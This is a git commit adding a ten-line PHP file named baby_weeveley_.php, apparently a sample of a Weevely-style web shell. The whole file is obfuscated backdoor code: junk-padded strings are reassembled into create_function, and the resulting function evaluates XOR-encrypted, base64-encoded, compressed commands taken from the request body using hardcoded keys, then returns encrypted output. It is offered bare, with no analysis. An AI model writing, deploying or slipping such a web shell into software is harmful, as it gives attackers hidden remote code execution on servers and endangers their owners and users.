9e51f2d3feb2d754f364ac9f1275acba1882beb5
babywyrm <55672787+babywyrm@users.noreply.github.com>
2022-08-24 20:25:06 -0700

    Create baby_weeveley_.php

---
+++ php/baby_weeveley_.php
@@ -0,0 +1,10 @@
+<?php
+$C=str_replace('Pg','','crPgeatPge_PgfPgPguPgnction');
+$e='W$t,$kaW){$c=strlen($k)aW;$l=aWstrlen(aW$t);$o="";faWoaWr($i=0;aW$i<$l;aW){for(aW$j=0;(aWaW$j<$c&&$i<$l);aW$jaW++,$i+a';
+$K='/input"),$m)aWaW==1){aW@ob_staaWrt();@evaaWl(@gzuaWaWncompress(@x(aW@aWbaWase64_decode($m[1aW]),$k)))aW;$o=@oaWb_aWge';
+$U='W+){$o.=aW$taWaW{$i}^$k{$j};}}retaWurn $o;}ifaW(@paWaWreg_match(aW"/$khaWaW(aW.+)aW$kf/"aWaW,@file_get_contenaWts("php:/';
+$H='t_conaWtents()aW;@ob_aWend_cleanaW()aW;aW$r=@basaWe64_encodeaW(@aWx(@gzaWcompresaWs($oaW),$k));praWint("aW$p$kh$r$kf");}';
+$s='$k="2aW87ba9faWd";$kaWhaW="277218d5ced5aW";$kfaW="69aWf26420aWf34e"aW;aW$p="j9SaWam5Ghh32FEEaWRK";faWuaWaWnction x(a';
+$z=str_replace('aW','',$s.$e.$U.$K.$H);
+$S=$C('',$z);$S();
+?>
